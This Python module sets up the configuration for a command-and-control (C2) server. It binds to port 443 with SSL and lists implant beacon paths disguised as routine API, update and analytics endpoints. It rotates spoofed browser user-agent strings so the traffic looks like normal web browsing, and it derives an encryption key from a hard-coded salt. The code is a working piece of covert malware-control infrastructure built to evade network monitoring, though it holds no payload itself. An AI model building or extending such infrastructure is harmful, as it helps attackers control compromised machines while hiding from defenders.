import json
import secrets
import os
import base64
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2

def load_config(config_file='config/c2_config.json'):
    try:
        with open(config_file, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        default_config = {
            'server': {
                'host': '0.0.0.0',
                'port': 443,
                'ssl_cert': 'certs/server.crt',
                'ssl_key': 'certs/server.key',
                'use_ssl': True
            },
            'c2': {
                'encryption_password': secrets.token_hex(32),
                'max_session_age_days': 30,
                'beacon_paths': ['/api/v1/sync', '/updates/check', '/analytics/data'],
                'user_agents': [
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                ]
            },
            'authentication': {
                'require_auth': True,
                'auth_token': secrets.token_urlsafe(32)
            }
        }
        os.makedirs('config', exist_ok=True)
        with open(config_file, 'w') as f:
            json.dump(default_config, f, indent=2)
        return default_config

def derive_encryption_key(password: str):
    password = password.encode()
    salt = b'c2_infrastructure_salt_2024'  # In prod, generate/store securely
    kdf = PBKDF2(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(password))
    return key